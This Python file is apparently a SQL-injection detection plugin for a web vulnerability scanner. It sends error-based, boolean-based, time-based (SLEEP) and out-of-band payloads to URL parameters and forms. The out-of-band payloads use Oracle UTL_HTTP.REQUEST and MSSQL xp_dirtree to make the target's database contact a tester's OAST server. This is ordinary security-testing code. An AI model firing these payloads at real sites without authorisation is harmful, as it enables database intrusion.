"""
SQL Injection Plugin
"""
import asyncio
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from scanner.plugins.base import BasePlugin

# Payloads for different SQLi techniques
ERROR_BASED_PAYLOADS = [
    "'", "''", "`", "``", "\"", "\"\"",
    "' OR 1=1 --", "\" OR 1=1 --", "OR 1=1 --",
    "' OR 'a'='a", "\" OR \"a\"=\"a\"", "OR 'a'='a",
]

BOOLEAN_BASED_PAYLOADS = {
    "AND 1=1 --": "AND 1=2 --",
    "OR 1=1 --": "OR 1=2 --",
    "AND TRUE --": "AND FALSE --",
}

TIME_BASED_PAYLOADS = {
    "AND SLEEP(5) --": 5,
    "OR SLEEP(5) --": 5,
}

# Common SQL error messages
ERROR_MESSAGES = [
    "you have an error in your sql syntax;", "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
]

class Plugin(BasePlugin):
    """
    SQL Injection plugin
    """
    def __init__(self):
        self.name = "sqli"
        self.description = "Detects SQL injection vulnerabilities"

    async def _test_error_based(self, url, method, data, requester):
        for payload in ERROR_BASED_PAYLOADS:
            try:
                if method == "post":
                    response = await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    response = await requester.get(url, params={k: payload for k in data.keys()})
                
                content = await response.text()
                for error in ERROR_MESSAGES:
                    if error in content.lower():
                        return f"Error-based SQLi found with payload '{payload}'"
            except Exception:
                pass
        return None

    async def _test_boolean_based(self, url, method, data, requester):
        for true_payload, false_payload in BOOLEAN_BASED_PAYLOADS.items():
            try:
                # Send true request
                if method == "post":
                    true_response = await requester.post(url, data={k: true_payload for k in data.keys()})
                else:
                    true_response = await requester.get(url, params={k: true_payload for k in data.keys()})
                true_content = await true_response.text()

                # Send false request
                if method == "post":
                    false_response = await requester.post(url, data={k: false_payload for k in data.keys()})
                else:
                    false_response = await requester.get(url, params={k: false_payload for k in data.keys()})
                false_content = await false_response.text()

                if true_content != false_content:
                    return f"Boolean-based SQLi found with payload '{true_payload}'"
            except Exception:
                pass
        return None

    async def _test_time_based(self, url, method, data, requester):
        for payload, delay in TIME_BASED_PAYLOADS.items():
            try:
                start_time = asyncio.get_event_loop().time()
                if method == "post":
                    await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    await requester.get(url, params={k: payload for k in data.keys()})
                end_time = asyncio.get_event_loop().time()

                if (end_time - start_time) > delay:
                    return f"Time-based SQLi found with payload '{payload}'"
            except Exception:
                pass
        return None

    async def _test_oast_based(self, url, method, data, requester, oast_server):
        if not oast_server:
            return None

        # Payloads for different database engines
        OAST_PAYLOADS = [
            f"' OR 1=1 AND (SELECT a FROM (SELECT a=1) a JOIN (SELECT a=1) b WHERE a=1 AND (SELECT UTL_HTTP.REQUEST('{oast_server}'))=1) --", # Oracle
            f"' OR 1=1 AND (SELECT master..xp_dirtree('\\{oast_server}\\test')) --", # MSSQL
        ]

        for payload in OAST_PAYLOADS:
            try:
                if method == "post":
                    await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    await requester.get(url, params={k: payload for k in data.keys()})
            except Exception:
                pass
        
        # The user needs to check their OAST server for interactions
        return f"OAST-based SQLi payload sent. Check your OAST server for interactions."

    async def run(self, target: str, requester, oast_server: str = None):
        vulnerabilities = []

        # 1. Test URL parameters
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)
        for param, values in query_params.items():
            original_value = values[0]
            
            # Error-based
            res = await self._test_error_based(target, "get", {param: original_value}, requester)
            if res:
                vulnerabilities.append(f"{res} in URL parameter '{param}' at {target}")

            # Boolean-based
            res = await self._test_boolean_based(target, "get", {param: original_value}, requester)
            if res:
                vulnerabilities.append(f"{res} in URL parameter '{param}' at {target}")

            # Time-based
            res = await self._test_time_based(target, "get", {param: original_value}, requester)
            if res:
                vulnerabilities.append(f"{res} in URL parameter '{param}' at {target}")

            # OAST-based
            res = await self._test_oast_based(target, "get", {param: original_value}, requester, oast_server)
            if res:
                vulnerabilities.append(f"{res} in URL parameter '{param}' at {target}")

        # 2. Test forms
        try:
            response = await requester.get(target)
            soup = BeautifulSoup(await response.text(), "html.parser")
            forms = soup.find_all("form")
        except Exception:
            forms = []

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea", "select"])
            form_url = urljoin(target, action)
            
            data = {}
            for i in inputs:
                name = i.get("name")
                if name:
                    data[name] = "test"

            # Error-based
            res = await self._test_error_based(form_url, method, data, requester)
            if res:
                vulnerabilities.append(f"{res} in form at {form_url}")

            # Boolean-based
            res = await self._test_boolean_based(form_url, method, data, requester)
            if res:
                vulnerabilities.append(f"{res} in form at {form_url}")

            # Time-based
            res = await self._test_time_based(form_url, method, data, requester)
            if res:
                vulnerabilities.append(f"{res} in form at {form_url}")

            # OAST-based
            res = await self._test_oast_based(form_url, method, data, requester, oast_server)
            if res:
                vulnerabilities.append(f"{res} in form at {form_url}")

        return vulnerabilities if vulnerabilities else None
